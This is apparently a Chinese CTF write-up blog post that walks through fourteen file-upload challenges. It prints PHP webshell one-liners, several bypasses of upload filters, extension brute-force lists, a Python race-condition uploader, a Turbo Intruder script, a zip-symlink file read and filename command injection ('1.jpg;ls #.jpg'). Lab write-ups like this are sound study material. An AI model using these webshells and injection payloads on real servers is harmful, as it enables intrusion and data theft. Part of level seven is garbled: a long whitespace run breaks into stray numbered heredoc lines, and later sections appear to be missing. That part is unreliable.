---
title: 文件上传（FU）
date: 2026-06-04 20:45:59
categories:
  - CTF
tags:
  - 文件上传
description: 学习文件传中喵！
cover: /img/cover-tech.svg
comments: true
---

## 第一题

看到其要上传文件，大致猜到该题为一道文件上传类型的题，将写好的一句话木马文件上传到相关链接

```php
<?php eval($_POST[1]);?>
```

发现界面出现一个链接点进去然后执行RCE语句即可,知道到flag。（Ctrl+f）

```php
File uploaded successfully
  
uploads/b2970820-23da-4054-878b-ca65add0487e.php
```

```
1=phpinfo();
```

## 第二题

1.上传shell.php发现格式不对，打开源码后发现不宜上传，则选择跟换上它允许的格式进行上传。

```php
<input type="file" name="image" id="image" accept="image/jpeg,image/jpg,image/png,image/gif,image/webp" required>
```

2，发现了对上传文件的要求

```php
 function validateFile(file) {
            const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
            if (!allowedTypes.includes(file.type)) {
                alert('只允许上传图片文件！(jpg, png, gif, webp)');
                return false;
            }
            
            const fileName = file.name.toLowerCase();
            const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
            const hasValidExtension = allowedExtensions.some(ext => fileName.endsWith(ext));
            if (!hasValidExtension) {
                alert('文件扩展名不被允许！只允许: .jpg, .jpeg, .png, .gif, .webp');
                return false;
            }
            
            const maxSize = 5 * 1024 * 1024;
            if (file.size > maxSize) {
                alert('文件大小超过限制！最大允许 5MB');
                return false;
            }
            
            const dangerousKeywords = ['php', 'shell', 'cmd', 'exec', 'system', 'eval'];
            for (let keyword of dangerousKeywords) {
                if (fileName.includes(keyword)) {
                    alert('文件名包含不允许的关键字！');
                    return false;
                }
            }
            
            return true;
```

3，接下来打开F12将该断代码删除掉，并且禁用前端的JS

```
image/jpeg,image/jpg,image/png,image/gif,image/webp" required
```

4.上传shell.php的文件回显

```
uploads//ae2bf594-59d3-49a0-9c4f-313c574a18e9.php
```

5访问该网址，然后即可使用下面的语句即可找打flag。

```
1=phpinfo（）;
```

当然也可以使用bp进行绕过，修改文件后缀名后直接，直接访问即可。

## 第三题

上传木马文件发现可以直接上传，但是页面回显{"success":false,"message":"File type not allowed"}打开源码后什么也没有发现说明我们上传的文件格式还是不行，然后上传1.png的文件后还是不行，说明其把内容也进行了过滤，然后直接去bp上传文件进行抓包，然后发送至攻击器，对文件后缀名进行爆破，后发现phtml的文件异常点击响应后找到了相应的地址，然后在浏览器进行RCE或者拿蚁剑直接连接木马即可得到flag。

```
phtml
php
php3
php4
php5
php7
php8
pht
phtm
phar
```

![image-20260526220932440](/img/posts/fustudy/01.webp)

## 第四题

传入木马图片后发现其返回，但是打开后发现什么也没有，可能是后缀名有问题

```
File uploaded successfully

uploads/c811fd1b-6873-4b28-85a4-cba624588c6f.png
```

再次打开bp依旧是phtml的文件有问题，找到文件的路径后访问

![image-20260528100534995](/img/posts/fustudy/02.webp)

![image-20260528100648491](/img/posts/fustudy/03.webp)

回显出木马成功传入，然后使用蚁剑或者F12输入查看flag即可。

```
1=phpinfo();
```

## 第五题

先传入shell.php发现依旧格式不允许，然后传入图片木马回显依旧错误

```php
"success":false,"message":"File content not allowed: PHP tags detected"}
```

本题依旧过滤了上传文件的内容，根据大佬的wp发现文件内容中不能出现<?php，所以这里得使用短标签进行绕过（需目标环境开启 `short_open_tag`）于是修改文件内容为

```php
GIF89a
<?= eval($_POST[1];?)
```

但是佬的笔记中指出该php的环境是php/5,6,40,然后仔细看了看发现PHP7.0版本移除之前，他是支持JS的HTML标签语法包裹php代码所以最后传入的内容应该为

```php
GIF89a
<script language="php">
    eval($_POST[1]);
</script>    
```

修改完内容后发现文件直接上传成功了，然后拿bp直接爆破后缀名字发现依旧是phtml，依旧发现其位置

```
uploads//ddb75d05-e4ef-49d4-8788-7f9e50af7d12.phtml
```

访问后F12拿到flag。

## 第六题

依旧php格式被过滤，发送图片木马成功了，但是通过大佬的wp发现php的版本发生了变化，然后直接使用短标签即可

```php
GIF89a
<?= eval($_POST[1]);?>
```

继续爆破后缀名，发现还是phtml有问题，那还说啥了，给你了，直接访问后就可以找flag了。

## 第七题

这次上传图片木马，发现回显出内容中有许多危险的函数，说明有危险词被过滤了

```php
{"success":false,"message":"File content not allowed: dangerous function detected"}
```

经过询问后得知可以用拼接函数进行内容上传

```php
GIF89a
<?= ('sys'.'tem')($_POST[1]); ?>
```

根据回显用POST传入1=env。（**注：** 不要拼接 `eval` ， **`eval`** 以及 PHP 8 中的 `assert`、`echo`、`include` 等属于**语言结构**，是 PHP 解析器的一部分，不是函数。PHP 引擎不支持动态调用语言结构。）

还可以用反引号绕过：

```php
GIF89a
<?= `$_POST[1]`; ?>
```

`<?=` 实际上等效于 `<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ?>  
3 EOF
4
5 bzip2 -c shell.php > shell.php.bz2
```

用该串代码在终端生产一个 shell.php.bz2 的一句话木马文件，直接上传这个文件，上传成功，然后访问/uploads/shell.php,然后使用1=phpinfo();找到flag。

## 第十题

打开这道题后发现只有登录界面，没有任何的的提示，所以直接放在bp里进行对密码的爆破

![image-20260528212100367](/img/posts/fustudy/04.webp)

直接登录后发现依旧上传.bz2的文件，但是它不允许php的文件出现，所以需要重新创作一个shell.phtml.bz2的文件，绕过php的限制。

```bash
1 cat > shell.php <<'EOF'
2 <?php phpinfo(); ?>
3 EOF
4 
5 bzip2 -c shell.php > shell.phtml.bz2
```

然后直接恢复后找到flag即可。

## 第十一题

依旧先上传shell.phjp的文件厚发现可以上传成功，但是点进去后发现回显错误，看了一眼发现是上传一个木马文件后直接就被删除了，所以用bp无限的上传文件，即可找到真正的位置，选择了null payload，无限重复，后找到了地址

![](/img/posts/fustudy/05.webp)

然后直接访问该地址，直接拿到flag。

文件为1.php

```
<?php system('cat /flag');?>
```

## 第十二题

上传shell.php的文件后发现上传成功，回显该信息，但是访问网址后回显NO found

```
File uploaded successfully

uploads/84ff788f-a008-4afd-8966-a0259e2fb7af.php
```

上传后的文件名变成了随机的 UUID ，所以人类的速度已经跟不上了，只能编写Python脚本

```python
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://docker.qingcen.net:30262/"
PAYLOAD = b"<?php system('cat /flag');?>"
STOP = threading.Event()

def worker():
    with requests.Session() as s:
        while not STOP.is_set():
            try:
                r = s.post(
                    f"{BASE_URL}/",
                    files={"image": ("shell.php", PAYLOAD, "application/x-php")},
                    timeout=3,
                )
                path = r.json().get("file_url")
                if not path:
                    continue

                text = s.get(f"{BASE_URL}/{path.lstrip('/')}", timeout=3).text.strip()
                if text.startswith("flag{") and text.endswith("}"):
                    STOP.set()
                    return text
            except (requests.RequestException, ValueError):
                pass

def main():
    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = [pool.submit(worker) for _ in range(20)]
        for f in as_completed(futures):
            flag = f.result()
            if flag:
                print(flag)
                return

if __name__ == "__main__":
    main()
```

当然，还可以用bp的扩展插件Turbo Intruder：

1. 抓取包含 `<?php system('cat /flag > 1.txt');?>` 的上传 POST 数据包。
2. 右键数据包选择 `扩展` -> `Turbo Intruder` -> `Send to turbo intruder`。
3. 在弹出的 Turbo Intruder 窗口下方的代码编辑器中，使用以下 Python 脚本替换默认脚本：

```python
import re

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
    for _ in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
    if req.status == 200:
        match = re.search(r'"file_url"\s*:\s*"([^"]+)"', req.response.decode('utf-8', 'ignore'))
        if match:
            path = match.group(1).replace('\\/', '/').lstrip('/')
            # 使用 .format() 替换 f-string 以兼容 Jython 2.7
            req.engine.queue("GET /{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(path, req.host))
```

1. 该脚本的作用是通过高并发上传该 PHP 文件，并在服务器返回随机生成的新路径时，瞬间发起读取该路径的请求。
2. 点击攻击后，该插件会不断上传 `<?php system('cat /flag > 1.txt');?>` ，并不断通过发送对上传文件后回显路径的请求执行该代码。
3. 1.txt 不会被删除，访问 `/uploads/1.txt` 拿到 flag 。

## 第十三题

打开容器后发现，只能够解压zip的文件，所以考虑上传木马文件的压缩包，但是发现上传的文件不会直接部署到web目录，所以得换个思路，打开源码后发现了一串注释

<!-- flag in /C000000quer.txt -->，作者在这里居然偷偷放了文件，直接去访问一手，但是还是访问不成功，后来知道了这其实是一个软连接，而文件位于根目录下面

**软链接**（Symbolic Link）是一种特殊的文件，它指向另一个文件或目录的路径。当用户访问软链接时，系统会自动跳转到其指向的目标文件。软链接与硬链接的主要区别在于，软链接本身不存储数据，而是通过路径引用指向目标文件，因此在目标文件被移动、重命名或删除时，软链接将失效，成为“死链接”【1】【2】。
创建软链接的命令为 `ln -s 源文件 目标文件`，其中“源文件”是你要链接的文件或目录的路径，而“目标文件”是你要创建软链接的名称【2】【3】。软链接在Linux系统中常用于创建快捷方式，方便用户快速访问目标文件或目录【1】【4】。

所以命令为

```
ln -s /COOOOker.txt 1.txt
```

```
zip -y payyload.zip 1.txt
```

创建好文件后直接将其压缩后上传，下载其回显的文件即可得到flag。

## 第十四题（软链接）

打开容器，发现其只能上传 jpg 后缀的文件， 打开源码后发现注释

```
 <!-- 源码被 pigeon 小猫娘吃掉了，还好我准备了备份，嘻~ -->
```

其说有备份源码，所以对 index.php 的后缀名进行爆破

```
.zip
.rar
.tar
.tar.gz
.7z
.bak
.old
.swp
.txt
```

然后得到备份文件是 index.php.bak 访问下载该文件，打开该文件后得到

```php
<?php
error_reporting(0);

$message = '';
$details = [];
$uploadedName = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_FILES['photo']) || $_FILES['photo']['error'] !== UPLOAD_ERR_OK) {
        $message = 'Upload failed. Please choose another photo.';
    } else {
        $uploadedName = $_FILES['photo']['name'];
        $extension = strtolower(pathinfo($uploadedName, PATHINFO_EXTENSION));

        if ($extension !== 'jpg') {
            $message = 'Only .jpg photos can enter the archive.';
        } else {
            $target = __DIR__ . '/uploads/' . $uploadedName;

            if (!move_uploaded_file($_FILES['photo']['tmp_name'], $target)) {
                $message = 'The archive could not store this photo.';
            } else {
                chdir(__DIR__);
                $command = 'file uploads/' . $uploadedName . ' 2>&1';
                exec($command, $details, $status);
                $message = $status === 0
                    ? 'Photo archived. The darkroom report is ready.'
                    : 'Photo archived, but the darkroom report looks unusual.';
            }
        }
    }
}
?>

```

```php
 $command = 'file uploads/' . $uploadedName . ' 2>&1';
 exec($command, $details, $status);
```

这俩段代码是最为关键的，第二段代码和 system 的作用一样，但是其并没有回显，但是下面的代码的  return 又将其回显，第一段代码是将第二个参数拼接到第一个参数的后面，所以创建一个名为 1.jpg;ls #.jpg 远程命令执行。将其上传后得到其目录。

![image-20260604204001873](/img/posts/fustudy/06.webp)

然后修改文件名为 1.jpg;cat pigeon_cat.php #.jpg 上传后即可拿到flag。
所有题目均由青岑提供，若有侵权，请及时联系作者